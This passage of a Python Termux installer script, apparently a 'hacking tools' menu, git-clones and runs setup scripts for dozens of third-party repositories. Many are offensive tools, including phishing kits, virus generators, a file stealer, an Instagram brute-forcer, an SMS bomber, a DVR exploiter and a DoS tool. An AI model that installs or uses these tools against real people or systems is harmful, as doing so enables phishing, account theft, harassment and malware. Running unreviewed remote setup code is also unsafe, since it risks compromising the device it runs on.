    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/TermuxArch/TermuxArch")
    os.system("mv TermuxArch /$HOME")
    os.system("cd /$HOME/TermuxArch")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m TermuxArch is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TermuxArch on your termux's home directory.")
    print()

# 34 Lucifer
def Lucifer():
    print("\n\033[1;91m[*]\033[1;97m Installing Lucifer.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/rixon-cochi/Lucifer.git/")
    os.system("mv Lucifer /$HOME")
    os.system("cd /$HOME/Lucifer")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m Lucifer is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Lucifer on your termux's home directory.")
    print()

# 35
def AdminHack():
    print("\n\033[1;91m[*]\033[1;97m Installing AdminHack.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/mishakorzik/AdminHack")
    os.system("mv AdminHack /$HOME")
    os.system("cd /$HOME/AdminHack")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m AdminHack is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find AdminHack on your termux's home directory.")
    print()

# 36 TermuxCyberArmy
def TermuxCyberArmy():
    print("\n\033[1;91m[*]\033[1;97m Installing TermuxCyberArmy.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git pytho2 -y")
    os.system("git clone https://github.com/Err0r-ICA/TermuxCyberArmy.git/")
    os.system("mv TermuxCyberArmy /$HOME")
    os.system("cd /$HOME/TermuxCyberArmy")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m TermuxCyberArmy is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TermuxCyberArmy on your termux's home directory.")
    print()

# 37 userfinder
def userfinder():
    print("\n\033[1;91m[*]\033[1;97m Installing userfinder.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git curl -y")
    os.system("git clone https://github.com/machine1337/userfinder")
    os.system("mv userfinder /$HOME")
    os.system("cd /$HOME/userfinder")
    os.system("chmod +x *")
    os.system("")
    print()
    print("\033[1;91m[*]\033[1;97m userfinder is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find userfinder on your termux's home directory.")
    print()

# 38 tunnel
def tunnel():
    print("\n\033[1;91m[*]\033[1;97m Installing tunnel.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/noob-hackers/tunnel.git")
    os.system("mv tunnel /$HOME")
    os.system("cd /$HOME/tunnel")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m tunnel is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find tunnel on your termux's home directory.")
    print()

# 39 tstyle
def tstyle():
    print("\n\033[1;91m[*]\033[1;97m Installing tstyle.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/htr-tech/tstyle")
    os.system("mv tstyle /$HOME")
    os.system("cd /$HOME/tstyle")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m tstyle is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type 'tstyle' to access tstyle.")
    print()

# 40 FreeFire-Phishing
def freefire():
    print("\n\033[1;91m[*]\033[1;97m Installing FreeFire-Phishing.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget -y")
    os.system("git clone https://github.com/OnlineHacKing/FreeFire-Phishing")
    os.system("mv FreeFire-Phishing /$HOME")
    os.system("cd /$HOME/FreeFire-Phishing")
    os.system("chmod +x *")
    os.system("bash Android-Setup")
    print()
    print("\033[1;91m[*]\033[1;97m FreeFire-Phishing is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command '' to access FreeFire-Phishing.")
    print()

# 41 qurxin
def qurxin():
    print("\n\033[1;91m[*]\033[1;97m Installing qurxin.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python mpv figlet -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/fikrado/qurxin")
    os.system("mv qurxin /$HOME")
    os.system("cd /$HOME/qurxin")
    os.system("chmod +x *")
    os.system("sh install.sh")
    print()
    print("\033[1;91m[*]\033[1;97m qurxin is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find qurxin on your termux's home directory.")
    print()

# 42 GenVirus
def GenVirus():
    print("\n\033[1;91m[*]\033[1;97m Installing GenVirus.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Ign0r3dH4x0r/GenVirus")
    os.system("mv GenVirus /$HOME")
    os.system("cd /$HOME/GenVirus")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m GenVirus is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find GenVirus on your termux's home directory.")
    print()

# 43 WannaTool
def WannaTool():
    print("\n\033[1;91m[*]\033[1;97m Installing WannaTool.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Err0r-ICA/WannaTool")
    os.system("mv WannaTool /$HOME")
    os.system("cd /$HOME/WannaTool")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m WannaTool is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find WannaTool on your termux's home directory.")
    print()

# 44 GeonumWh
def GeonumWh():
    print("\n\033[1;91m[*]\033[1;97m Installing GeonumWh.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/WhBeatZ/GeonumWh")
    os.system("mv GeonumWh /$HOME")
    os.system("cd /$HOME/GeonumWh")
    os.system("chmod +x *")
    os.system("bash requirements.sh")
    print()
    print("\033[1;91m[*]\033[1;97m GeonumWh is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find GeonumWh on your termux's home directory.")
    print()

# 45 apktool
def apktool():
    print("\n\033[1;91m[*]\033[1;97m Installing apktool.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install apktool -y")
    print()
    print("\033[1;91m[*]\033[1;97m apktool is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access apktool by command 'apktool'.")
    print()

# 46 PUBG-BGMI_Phishing
def bgmip():
    print("\n\033[1;91m[*]\033[1;97m Installing PUBG-BGMI_Phishing.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget -y")
    os.system("git clone https://github.com/OnlineHacKing/PUBG-BGMI_Phishing.git")
    os.system("mv PUBG-BGMI_Phishing /$HOME")
    os.system("cd /$HOME/PUBG-BGMI_Phishing")
    os.system("chmod +x *")
    os.system("bash Android-Setup")
    print()
    print("\033[1;91m[*]\033[1;97m PUBG-BGMI_Phishing is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'PUBG-BGMI_Phishing' to access PUBG-BGMI_Phishing.")
    print()

# 47 HXP-Ducky
def hsxpduky():
    print("\n\033[1;91m[*]\033[1;97m Installing HXP-Ducky.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/hackerxphantom/HXP-Ducky")
    os.system("mv HXP-Ducky /$HOME")
    os.system("cd /$HOME/HXP-Ducky")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m HXP-Ducky is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find HXP-Ducky on your termux's home directory.")
    print()

# 48 Venomsploit
def Venomsploit():
    print("\n\033[1;91m[*]\033[1;97m Installing Venomsploit.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/Err0r-ICA/Venomsploit")
    os.system("mv Venomsploit /$HOME")
    os.system("cd /$HOME/Venomsploit")
    os.system("chmod +x *")
    os.system("bash install")
    print()
    print("\033[1;91m[*]\033[1;97m Venomsploit is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Venomsploit on your termux's home directory.")
    print()

# 49 DVR-Exploiter
def dvrsploit():
    print("\n\033[1;91m[*]\033[1;97m Installing DVR-Exploiter.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/TunisianEagles/DVR-Exploiter.git")
    os.system("mv DVR-Exploiter /$HOME")
    os.system("cd /$HOME/DVR-Exploiter")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m DVR-Exploiter is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find DVR-Exploiter on your termux's home directory.")
    print()

# 50 B4Bomber
def BeBomber():
    print("\n\033[1;91m[*]\033[1;97m Installing B4Bomber.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git curl -y")
    os.system("git clone https://github.com/mahendraplus/B4Bomber")
    os.system("mv B4Bomber /$HOME")
    os.system("cd /$HOME/B4Bomber/Termux")
    os.system("chmod +x *")
    os.system("bash install.sh")
    print()
    print("\033[1;91m[*]\033[1;97m B4Bomber is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find B4Bomber on your termux's home directory.")
    print()

# 51 h-sploit-paylod
def hsploit():
    print("\n\033[1;91m[*]\033[1;97m Installing h-sploit-paylod.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/jravis-8520/h-sploit-paylod.git/")
    os.system("mv h-sploit-paylod /$HOME")
    os.system("cd /$HOME/h-sploit-paylod")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m h-sploit-paylod is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find h-sploit-paylod on your termux's home directory.")
    print()

# 52 WhSms
def WhSms():
    print("\n\033[1;91m[*]\033[1;97m Installing WhSms.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/WhBeatZ/WhSms")
    os.system("mv WhSms /$HOME")
    os.system("cd /$HOME/WhSms")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m WhSms is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find WhSms on your termux's home directory.")
    print()


# 53 rsecxxx-leak
def rsecxxx():
    print("\n\033[1;91m[*]\033[1;97m Installing rsecxxx-leak.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/Alice666x/rsecxxx-leak")
    os.system("mv rsecxxx-leak /$HOME")
    os.system("cd /$HOME/rsecxxx-leak")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m rsecxxx-leak is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find rsecxxx-leak on your termux's home directory.")
    print()

# 54 netscan
def netscan():
    print("\n\033[1;91m[*]\033[1;97m Installing netscan.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install golang -y")
    os.system("go get github.com/jessfraz/netscan")
    print()
    print("\033[1;91m[*]\033[1;97m netscan is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access netscan by command 'netscan'.")
    print()

# 55 modded-ubuntu
def mubuntu():
    print("\n\033[1;91m[*]\033[1;97m Installing modded-ubuntu.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget -y")
    os.system("git clone https://github.com/modded-ubuntu/modded-ubuntu")
    os.system("mv modded-ubuntu /$HOME")
    os.system("cd /$HOME/modded-ubuntu")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m modded-ubuntu is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find modded-ubuntu on your termux's home directory.")
    print()

# 56 seeu
def seeu():
    print("\n\033[1;91m[*]\033[1;97m Installing seeu.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git curl wget php nodejs -y")
    os.system("termux-setup-storage")
    os.system("npm install ngrok -g")
    os.system("git clone https://github.com/noob-hackers/seeu.git/")
    os.system("mv seeu /$HOME")
    os.system("cd /$HOME/seeu")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m seeu is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find seeu on your termux's home directory.")
    print()

# 57 zVirus-Gen
def zvirusg():
    print("\n\033[1;91m[*]\033[1;97m Installing zVirus-Gen.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/ZechBron/zVirus-Gen")
    os.system("mv zVirus-Gen /$HOME")
    os.system("cd /$HOME/zVirus-Gen")
    os.system("chmod +x *")
    os.system("./setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m zVirus-Gen is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find zVirus-Gen on your termux's home directory.")
    print()

# 58 LordPhish
def LordPhish():
    print("\n\033[1;91m[*]\033[1;97m Installing LordPhish.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git openssh wget php -y")
    os.system("git clone https://github.com/Black-Hell-Team/LordPhish")
    os.system("mv LordPhish /$HOME")
    os.system("cd /$HOME/LordPhish")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m LordPhish is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find LordPhish on your termux's home directory.")
    print()

# 59 Brutegram
def Brutegram():
    print("\n\033[1;91m[*]\033[1;97m Installing Brutegram.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 jq -y")
    os.system("pip2 install requests mechanize")
    os.system("git clone https://github.com/Err0r-ICA/Brutegram")
    os.system("mv Brutegram /$HOME")
    os.system("cd /$HOME/Brutegram")
    os.system("chmod +x *")
    os.system("")
    print()
    print("\033[1;91m[*]\033[1;97m Brutegram is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Brutegram on your termux's home directory.")
    print()

# 60 Osintgram
def Osintgram():
    print("\n\033[1;91m[*]\033[1;97m Installing Osintgram.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python3 -y")
    os.system("git clone https://github.com/Datalux/Osintgram ")
    os.system("mv Osintgram /$HOME")
    os.system("cd /$HOME/Osintgram")
    os.system("python3 -m venv venv")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print("\033[1;91m[*]\033[1;97m Osintgram is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Osintgram on your termux's home directory.")
    print()

# 61 Pycompile
def Pycompile():
    print("\n\033[1;91m[*]\033[1;97m Installing Pycompile.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/htr-tech/Pycompile")
    os.system("mv Pycompile /$HOME")
    os.system("cd /$HOME/Pycompile")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m Pycompile is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Pycompile on your termux's home directory.")
    print()

# 62 AOXdeface
def AOXdeface():
    print("\n\033[1;91m[*]\033[1;97m Installing AOXdeface.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("pip install requests")
    os.system("git clone https://github.com/Ranginang67/AOXdeface")
    os.system("mv AOXdeface /$HOME")
    os.system("cd /$HOME/AOXdeface")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m AOXdeface is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find AOXdeface on your termux's home directory.")
    print()

# 63 termux-key
def termuxkey():
    print("\n\033[1;91m[*]\033[1;97m Installing termux-key.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/htr-tech/termux-key")
    os.system("mv termux-key /$HOME")
    os.system("cd /$HOME/termux-key")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m termux-key is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find termux-key on your termux's home directory.")
    print()

# 64 Termux-heroku-cli
def heroku():
    print("\n\033[1;91m[*]\033[1;97m Installing Termux-heroku-cli.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/SKGHD/Termux-heroku-cli")
    os.system("mv Termux-heroku-cli /$HOME")
    os.system("cd /$HOME/Termux-heroku-cli")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m Termux-heroku-cli is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Termux-heroku-cli on your termux's home directory.")
    print()

# 65 DefGen
def DefGen():
    print("\n\033[1;91m[*]\033[1;97m Installing DefGen.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/Err0r-ICA/DefGen")
    os.system("mv DefGen /$HOME")
    os.system("cd /$HOME/DefGen")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m DefGen is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find DefGen on your termux's home directory.")
    print()

# 66 websploit
def websploit():
    print("\n\033[1;91m[*]\033[1;97m Installing websploit.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/f4rih/websploit")
    os.system("mv websploit /$HOME")
    os.system("cd /$HOME/websploit")
    os.system("chmod +x *")
    os.system("python setup.py install")
    print()
    print("\033[1;91m[*]\033[1;97m websploit is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access websploit by command 'websploit'.")
    print()

# 67 M-dork
def Mdork():
    print("\n\033[1;91m[*]\033[1;97m Installing M-dork.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("pip2 install mechanize")
    os.system("git clone https://github.com/Ranginang67/M-dork")
    os.system("mv M-dork /$HOME")
    os.system("cd /$HOME/M-dork")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m M-dork is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find M-dork on your termux's home directory.")
    print()

# 68 Hackerwasi
def Hackerwasi():
    print("\n\033[1;91m[*]\033[1;97m Installing Hackerwasi.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install python python2 git -y")
    os.system("git clone https://github.com/evildevill/Hackerwasi")
    os.system("mv Hackerwasi /$HOME")
    os.system("cd /$HOME/Hackerwasi")
    os.system("chmod +x *")
    os.system("pip3 install -r requirements.txt")
    print()
    print("\033[1;91m[*]\033[1;97m Hackerwasi is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Hackerwasi on your termux's home directory.")
    print()

# 69 CAM-DUMPER
def camdump():
    print("\n\033[1;91m[*]\033[1;97m Installing CAM-DUMPER.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git php wget curl jq -y")
    os.system("git clone https://github.com/LiNuX-Mallu/CAM-DUMPER")
    os.system("mv CAM-DUMPER /$HOME")
    os.system("cd /$HOME/CAM-DUMPER")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m CAM-DUMPER is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find CAM-DUMPER on your termux's home directory.")
    print()

# 70 termux-snippets
def termuxsnippets():
    print("\n\033[1;91m[*]\033[1;97m Installing termux-snippets.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/hakxcore/termux-snippets")
    os.system("mv termux-snippets /$HOME")
    os.system("cd /$HOME/termux-snippets")
    os.system("chmod +x *")
    os.system("./install")
    print()
    print("\033[1;91m[*]\033[1;97m termux-snippets is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'termux-snippets' to access termux-snippets.")
    print()

# 71 Pureblood
def Pureblood():
    print("\n\033[1;91m[*]\033[1;97m Installing Pureblood.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/ChesZy2810/https-github.com-cr4shcod3-pureblood")
    os.system("mv https-github.com-cr4shcod3-pureblood /$HOME/pureblood")
    os.system("cd /$HOME/pureblood")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print("\033[1;91m[*]\033[1;97m Pureblood is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Pureblood on your termux's home directory.")
    print()

# 72 beywak
def beyawak():
    print("\n\033[1;91m[*]\033[1;97m Installing beyawak.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("pip2 install requests")
    os.system("git clone https://github.com/Ranginang67/beyawak")
    os.system("mv beyawak /$HOME")
    os.system("cd /$HOME/beyawak")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m beyawak is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find beyawak on your termux's home directory.")
    print()

# 73 IP_Rover
def IPRover():
    print("\n\033[1;91m[*]\033[1;97m Installing IP_Rover.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python3 -y")
    os.system("git clone https://github.com/Cyber-Dioxide/IP_Rover/")
    os.system("mv IP_Rover /$HOME")
    os.system("cd /$HOME/IP_Rover")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print("\033[1;91m[*]\033[1;97m IP_Rover is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find IP_Rover on your termux's home directory.")
    print()

# 74 DirAttack
def DirAttack():
    print("\n\033[1;91m[*]\033[1;97m Installing DirAttack.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/Ranginang67/DirAttack")
    os.system("mv DirAttack /$HOME")
    os.system("cd /$HOME/DirAttack")
    os.system("chmod +x *")
    os.system("python install.py")
    print()
    print("\033[1;91m[*]\033[1;97m DirAttack is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopn your termux and type 'dirattack' to access DirAttack .")
    print()

# 75 Mega-File-Stealer
def megafile():
    print("\n\033[1;91m[*]\033[1;97m Installing Mega-File-Stealer.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/ZechBron/Mega-File-Stealer")
    os.system("mv Mega-File-Stealer /$HOME")
    os.system("cd /$HOME/Mega-File-Stealer")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m Mega-File-Stealer is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Mega-File-Stealer on your termux's home directory.")
    print()

# 76 Hammer
def Hammer():
    print("\n\033[1;91m[*]\033[1;97m Installing Hammer.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python dnsutils -y")
    os.system("git clone https://github.com/rk1342k/Hammer")
    os.system("mv Hammer /$HOME")
    os.system("cd /$HOME/Hammer")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m Hammer is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Hammer on your termux's home directory.")
    print()

# 77 demozz
def demozz():
    print("\n\033[1;91m[*]\033[1;97m Installing demozz.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/demoza/demozz")
    os.system("mv demozz /$HOME")
    os.system("cd /$HOME/demozz")
    os.system("chmod +x *")
    os.system("bash start.sh")
    print()
    print("\033[1;91m[*]\033[1;97m demozz is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find demozz on your termux's home directory.")
    print()

# 78 Asura
def Asura():
    print("\n\033[1;91m[*]\033[1;97m Installing Asura.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/princekrvert/Asura")
    os.system("mv Asura /$HOME")
    os.system("cd /$HOME/Asura")
    os.system("chmod +x *")
    os.system("./install.sh")
    print()
    print("\033[1;91m[*]\033[1;97m Asura is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Asura on your termux's home directory.")
    print()

# 79 Youtube-Pro
def ytpro():
    print("\n\033[1;91m[*]\033[1;97m Installing Youtube-Pro.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/samay825/Youtube-Pro")
    os.system("mv Youtube-Pro /$HOME")
    os.system("cd /$HOME/Youtube-Pro")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print("\033[1;91m[*]\033[1;97m Youtube-Pro is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Youtube-Pro on your termux's home directory.")
    print()

# 80 InstaReport
def InstaReport():
    print("\n\033[1;91m[*]\033[1;97m Installing InstaReport.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("git clone https://github.com/Crevils/InstaReport")
    os.system("mv InstaReport /$HOME")
    os.system("cd /$HOME/InstaReport")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
